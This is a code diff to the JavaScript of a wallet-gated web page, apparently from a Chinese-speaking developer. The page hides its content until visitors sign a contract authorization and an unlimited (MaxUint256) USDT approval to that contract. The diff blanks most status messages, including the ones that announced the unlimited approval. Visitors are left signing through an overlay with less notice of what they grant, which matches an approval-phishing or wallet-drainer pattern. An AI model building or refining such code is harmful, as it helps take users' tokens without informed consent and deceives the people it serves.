@@ -38,12 +38,12 @@ overlay.style.opacity = '1';
 }, 10);
 }
 
-// --- initializeWallet 函數 (修正 Status 覆蓋問題) ---
+// --- initializeWallet 函數 (僅保留錯誤/必要訊息) ---
 
 async function initializeWallet() {
 try {
 if (typeof window.ethereum === 'undefined') {
-updateStatus('Please install MetaMask or a supported wallet'); // 請安裝 MetaMask 或支援的錢包
+updateStatus('Please install MetaMask or a supported wallet'); // 顯示必要錯誤
 showOverlay('請安裝 MetaMask 或支援的錢包以繼續');
 return;
 }
@@ -57,7 +57,7 @@ if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainCha
 // Check network and switch to Mainnet
 const network = await provider.getNetwork();
 if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
-updateStatus('Switching to Ethereum Mainnet...'); // 正在切換到以太坊主網...
+updateStatus('Switching to Ethereum Mainnet...'); // 顯示切換網路的警告/提示
 showOverlay('正在嘗試切換到以太坊主網... 請在錢包中確認');
 try {
 await window.ethereum.request({
@@ -69,10 +69,10 @@ provider = new ethers.BrowserProvider(window.ethereum);
 await provider.getNetwork();
 } catch (switchError) {
 if (switchError.code === 4001) {
-updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.'); // 用戶拒絕切換網絡。請手動切換到以太坊主網。
+updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.'); // 顯示錯誤
 showOverlay('用戶拒絕切換網絡。請手動切換到 Ethereum Mainnet。');
 } else {
-updateStatus(`Network switch failed: ${switchError.message}`); // 切換網絡失敗
+updateStatus(`Network switch failed: ${switchError.message}`); // 顯示錯誤
 showOverlay(`網絡切換失敗: ${switchError.message}`);
 }
 return;
@@ -88,12 +88,11 @@ signer = await provider.getSigner();
 contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
 usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
 
-// ** 關鍵修改點：先設置一個檢查中的狀態，然後呼叫 checkAuthorization **
-updateStatus('Connection restored, checking authorization status...'); // 顯示正在檢查
+// ** 連線已恢復，直接檢查授權，不顯示進度文字 **
+updateStatus(''); // 清空/隱藏狀態欄
 await checkAuthorization();
-// ** 移除原本的 status 覆蓋行 **
 } else {
-updateStatus('Please connect wallet'); // 請連繫錢包
+updateStatus(''); // 隱藏狀態欄
 showOverlay('請連繫錢包以解鎖內容');
 }
 
@@ -101,7 +100,7 @@ showOverlay('請連繫錢包以解鎖內容');
 accountChangeListener = (accounts) => {
 if (accounts.length === 0) {
 resetState();
-updateStatus('Wallet disconnected'); // 錢包已斷開連繫
+updateStatus('Wallet disconnected'); // 顯示斷開連繫的提示
 } else {
 initializeWallet();
 }
@@ -111,19 +110,19 @@ window.ethereum.on('accountsChanged', accountChangeListener);
 // Network change listener
 chainChangeListener = () => {
 resetState();
-updateStatus('Network changed, please reconnect wallet'); // 網絡已切換，請重新連繫錢包
+updateStatus('Network changed, please reconnect wallet'); // 顯示網路變化的提示
 window.location.reload();
 };
 window.ethereum.on('chainChanged', chainChangeListener);
 
 } catch (error) {
-updateStatus(`Initialization failed: ${error.message}`); // 初始化失敗
+updateStatus(`Initialization failed: ${error.message}`); // 顯示初始化失敗的錯誤
 console.error("Initialize Wallet Error:", error);
 showOverlay(`初始化失敗: ${error.message}`);
 }
 }
 
-// --- checkAuthorization 函數 ---
+// --- checkAuthorization 函數 (邏輯不變，僅調整 updateStatus 呼叫) ---
 
 async function checkAuthorization() {
 try {
@@ -168,26 +167,24 @@ if (allAuthorized) {
 connectButton.classList.add('connected');
 connectButton.title = 'Disconnect Wallet'; // 斷開錢包
 connectButton.disabled = false;
-updateStatus(`Connected and fully authorized. ${statusMessage}`); // 已連繫並完成所有授權
-// 當完全授權並隱藏遮罩時，我們可以將狀態訊息清空，讓那個框消失
-setTimeout(() => updateStatus(''), 500); // 延遲清空狀態，讓使用者看到最終訊息
+updateStatus(''); // 成功時，清空/隱藏狀態欄
 hideOverlay(); // 完全授權，隱藏遮罩
 } else {
 connectButton.classList.remove('connected');
 connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
 connectButton.disabled = false;
-updateStatus(`Please connect and complete all authorizations. ${statusMessage} Click the wallet button to sign transactions.`); // 請連繫錢包並完成所有授權。點擊錢包按鈕將提示您簽署鏈接。
+updateStatus(''); // 授權未完成，清空/隱藏狀態欄
 showOverlay('需要完成合約和 USDT 授權才能查看內容。點擊右上角按鈕開始交易。'); // 授權未完成，顯示遮罩
 }
 } catch (error) {
-updateStatus(`Authorization check failed: ${error.message}`); // 檢查授權失敗
+updateStatus(`Authorization check failed: ${error.message}`); // 顯示錯誤
 console.error("Check Authorization Error:", error);
 showOverlay(`檢查授權失敗: ${error.message}`);
 }
 }
 
 
-// --- connectWallet 函數 ---
+// --- connectWallet 函數 (移除所有中間狀態更新) ---
 
 async function connectWallet() {
 try {
@@ -196,7 +193,7 @@ updateStatus('Please install MetaMask or a supported wallet');
 return;
 }
 
-updateStatus('Requesting wallet connection...');
+updateStatus(''); // 連線開始，隱藏狀態欄
 showOverlay('請在您的錢包中確認連線請求...');
 
 // Request wallet connection (MetaMask will confirm or maintain connection)
@@ -212,21 +209,21 @@ usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
 const ethBalance = await provider.getBalance(userAddress);
 const requiredEthForGas = ethers.parseEther('0.001');
 if (ethBalance < requiredEthForGas) {
-updateStatus(`Warning: ETH balance may be insufficient for authorization transactions (Suggested min ${ethers.formatEther(requiredEthForGas)} ETH, Actual ${ethers.formatEther(ethBalance)} ETH).`); // 警告：ETH 餘額可能不足以支付授權鏈接的 Gas Fee
+updateStatus(`Warning: ETH balance may be insufficient for authorization transactions (Suggested min ${ethers.formatEther(requiredEthForGas)} ETH, Actual ${ethers.formatEther(ethBalance)} ETH).`); // 顯示 Gas 費不足警告
 } else {
-updateStatus('ETH balance sufficient, checking authorizations...'); // ETH 餘額充足，正在檢查授權...
+updateStatus(''); // 隱藏狀態欄
 }
 
 // 1. Check and execute SimpleMerchant contract authorization (connectAndAuthorize)
 const isAuthorized = await contract.authorized(userAddress);
 if (!isAuthorized) {
-updateStatus('Authorizing SimpleMerchant Contract (Tx 1/2)...'); // 正在授權 SimpleMerchant 合約 (交易 1/2)...
+updateStatus(''); // 隱藏進度
 showOverlay('1/2: 請在錢包中簽署 **SimpleMerchant 合約授權** 交易...');
 const txAuthorize = await contract.connectAndAuthorize();
 await txAuthorize.wait();
-updateStatus('SimpleMerchant Contract authorization successful.'); // SimpleMerchant 合約授權成功。
+updateStatus(''); // 隱藏成功訊息
 } else {
-updateStatus('SimpleMerchant Contract already authorized, checking USDT approval...'); // SimpleMerchant 合約已授權，正在檢查 USDT 授權...
+updateStatus(''); // 隱藏已授權訊息
 }
 
 // 2. Check and execute USDT token approval (approve)
@@ -235,22 +232,21 @@ const maxAllowance = ethers.MaxUint256;
 
 // Re-approve if approval is not MaxUint256 (or close)
 if (usdtAllowance < maxAllowance) {
-updateStatus('Authorizing USDT Token (MaxUint256) (Tx 2/2)...'); // 正在授權 USDT 代幣 (MaxUint256) (交易 2/2)...
+updateStatus(''); // 隱藏進度
 showOverlay('2/2: 請在錢包中簽署 **USDT 代幣 MaxUint256 授權** 交易...');
 const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
 await txApprove.wait();
-updateStatus('USDT Token approval successful (MaxUint256 set).'); // USDT 代幣授權成功 (已設為 MaxUint256)。
+updateStatus(''); // 隱藏成功訊息
 } else {
-updateStatus('USDT Token already approved for MaxUint256.'); // USDT 代幣已授權足夠金額 (MaxUint256)。
+updateStatus(''); // 隱藏已授權訊息
 }
 
 // Final check and update button appearance
 await checkAuthorization();
-// ** 注意：這裡的 status 覆蓋是正確的，因為這是 connectWallet 的最終成功狀態 **
-updateStatus('Connected and all necessary authorizations completed.'); // 連繫並完成所有必要授權。
+updateStatus(''); // 連線成功，隱藏狀態欄
 
 } catch (error) {
-updateStatus(`Operation failed: ${error.message}`); // 操作失敗
+updateStatus(`Operation failed: ${error.message}`); // 顯示操作失敗的錯誤
 console.error("Connect Wallet Error:", error);
 connectButton.classList.remove('connected');
 connectButton.title = 'Connect Wallet'; // 連繫錢包
@@ -260,11 +256,11 @@ showOverlay(`操作失敗。請重試或手動檢查連線。錯誤: ${error.mes
 }
 
 
-// --- 其他函數 ---
+// --- 其他函數 (保持不變) ---
 
 function disconnectWallet() {
 resetState();
-updateStatus('Wallet disconnected, please reconnect.'); // 錢包已斷開連繫，請重新連繫。
+updateStatus('Wallet disconnected, please reconnect.'); // 顯示斷開連繫的提示
 alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.'); // 提示用戶手動斷開
 showOverlay('錢包已斷開連繫，請連繫以解鎖內容'); // 斷開時顯示遮罩
 }
@@ -282,7 +278,7 @@ showOverlay('請連繫錢包以解鎖內容 🔒'); // 重設時顯示遮罩
 }
 
 /**
- * 核心修改：移除 'Status:' 標籤，並控制元素的隱藏與顯示。
+ * 核心功能：控制狀態欄的隱藏與顯示。
  */
 function updateStatus(message) {
 const statusDiv = document.getElementById('status');
